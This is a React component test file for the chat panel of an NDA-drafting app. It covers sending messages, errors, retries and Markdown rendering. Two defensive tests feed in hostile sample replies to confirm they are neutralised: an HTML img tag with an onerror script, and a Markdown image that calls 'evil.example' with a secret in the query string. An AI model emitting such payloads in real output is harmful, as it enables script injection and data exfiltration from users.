import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import { GREETING } from "@/lib/chat";
import { defaultNdaData } from "@/lib/nda";
import { fakeChatApi, requestBody, updates } from "@/test-utils/fakeChat";
import NdaChat from "./NdaChat";

function setup() {
  const user = userEvent.setup();
  const onUpdates = vi.fn();
  render(<NdaChat fields={defaultNdaData("2026-10-16")} onUpdates={onUpdates} />);
  return { user, onUpdates, message: screen.getByLabelText("Message"), send: screen.getByRole("button", { name: "Send" }) };
}

const bubbles = () =>
  within(screen.getByRole("list", { name: "Conversation" }))
    .getAllByRole("listitem")
    .map((li) => li.textContent);

describe("NdaChat", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("opens with a greeting that asks about the parties, without calling the AI", () => {
    const fetchMock = fakeChatApi();
    setup();
    expect(bubbles()).toEqual([GREETING]);
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("sends the message and shows the AI's reply", async () => {
    fakeChatApi({ reply: "Thanks! Who is signing for Acme?" });
    const { user, message } = setup();
    await user.type(message, "Acme Inc and Globex LLC{Enter}");
    expect(await screen.findByText("Thanks! Who is signing for Acme?")).toBeInTheDocument();
    expect(bubbles()).toEqual([GREETING, "Acme Inc and Globex LLC", "Thanks! Who is signing for Acme?"]);
    expect(message).toHaveValue("");
  });

  it("sends the whole conversation each turn", async () => {
    const fetchMock = fakeChatApi({ reply: "First reply" }, { reply: "Second reply" });
    const { user, message } = setup();
    await user.type(message, "one{Enter}");
    await screen.findByText("First reply");
    await user.type(message, "two{Enter}");
    await screen.findByText("Second reply");

    expect(fetchMock).toHaveBeenCalledWith("/api/chat", expect.objectContaining({ method: "POST" }));
    expect(requestBody(fetchMock, 1).messages).toEqual([
      { role: "assistant", content: GREETING },
      { role: "user", content: "one" },
      { role: "assistant", content: "First reply" },
      { role: "user", content: "two" },
    ]);
  });

  it("passes the AI's field updates up", async () => {
    fakeChatApi({ reply: "Noted.", updates: { governingLaw: "Delaware" } });
    const { user, message, onUpdates } = setup();
    await user.type(message, "Delaware law{Enter}");
    await screen.findByText("Noted.");
    expect(onUpdates).toHaveBeenCalledWith(updates({ governingLaw: "Delaware" }));
  });

  it("shows that the AI is thinking and blocks sending until it replies", async () => {
    let answer!: (r: Response) => void;
    vi.stubGlobal("fetch", vi.fn(() => new Promise<Response>((resolve) => (answer = resolve))));
    const { user, message, send } = setup();
    await user.type(message, "hello{Enter}");
    expect(screen.getByRole("status")).toHaveTextContent("Thinking");
    await user.type(message, "again");
    expect(send).toBeDisabled();

    answer(new Response(JSON.stringify({ reply: "Hi there", updates: updates() })));
    expect(await screen.findByText("Hi there")).toBeInTheDocument();
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
    expect(send).toBeEnabled();
  });

  it("uses Shift+Enter for a new line instead of sending", async () => {
    const fetchMock = fakeChatApi();
    const { user, message } = setup();
    await user.type(message, "line one{Shift>}{Enter}{/Shift}line two");
    expect(message).toHaveValue("line one\nline two");
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it("does not send an empty message", async () => {
    const fetchMock = fakeChatApi();
    const { user, message, send } = setup();
    expect(send).toBeDisabled();
    await user.type(message, "   {Enter}");
    expect(fetchMock).not.toHaveBeenCalled();
    expect(bubbles()).toEqual([GREETING]);
  });

  it("shows the server's error and puts the message back to retry", async () => {
    fakeChatApi({ status: 502, detail: "The AI assistant didn't respond. Please try again." }, { reply: "Back now!" });
    const { user, message, onUpdates } = setup();
    await user.type(message, "Acme Inc{Enter}");

    expect(await screen.findByRole("alert")).toHaveTextContent("The AI assistant didn't respond. Please try again.");
    expect(message).toHaveValue("Acme Inc");
    expect(bubbles()).toEqual([GREETING]);
    expect(onUpdates).not.toHaveBeenCalled();

    await user.type(message, "{Enter}");
    expect(await screen.findByText("Back now!")).toBeInTheDocument();
    expect(screen.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("explains when the server can't be reached", async () => {
    fakeChatApi(new TypeError("Failed to fetch"));
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    expect(await screen.findByRole("alert")).toHaveTextContent("Couldn't reach Prelegal");
  });

  it("falls back to a general error when the server sends no detail", async () => {
    fakeChatApi({ status: 500 });
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    expect(await screen.findByRole("alert")).toHaveTextContent("Something went wrong. Please try again.");
  });

  it("renders the AI's Markdown but shows the user's text as typed", async () => {
    fakeChatApi({ reply: "I need:\n\n1. **Names**\n2. Titles" });
    const { user, message } = setup();
    await user.type(message, "**not bold**{Enter}");
    const names = await screen.findByText("Names");
    expect(names.tagName).toBe("STRONG");
    expect(screen.getByText("**not bold**")).toBeInTheDocument();
  });

  it("does not render HTML sent by the AI", async () => {
    fakeChatApi({ reply: 'Hello <img src=x onerror="alert(1)">' });
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    await screen.findByText(/Hello/);
    expect(document.querySelector("img")).toBeNull();
  });

  it("keeps a new draft typed while waiting if the request then fails", async () => {
    let fail!: () => void;
    vi.stubGlobal(
      "fetch",
      vi.fn(() => new Promise<Response>((_, reject) => (fail = () => reject(new TypeError("Failed to fetch"))))),
    );
    const { user, message } = setup();
    await user.type(message, "first{Enter}");
    await user.type(message, "my next answer");
    fail();
    expect(await screen.findByRole("alert")).toBeInTheDocument();
    expect(message).toHaveValue("my next answer");
  });

  it("does not load images from the AI's Markdown", async () => {
    fakeChatApi({ reply: "See ![tracker](https://evil.example/x.png?q=secret)" });
    const { user, message } = setup();
    await user.type(message, "hi{Enter}");
    await screen.findByText(/See/);
    expect(document.querySelector("img")).toBeNull();
  });
});
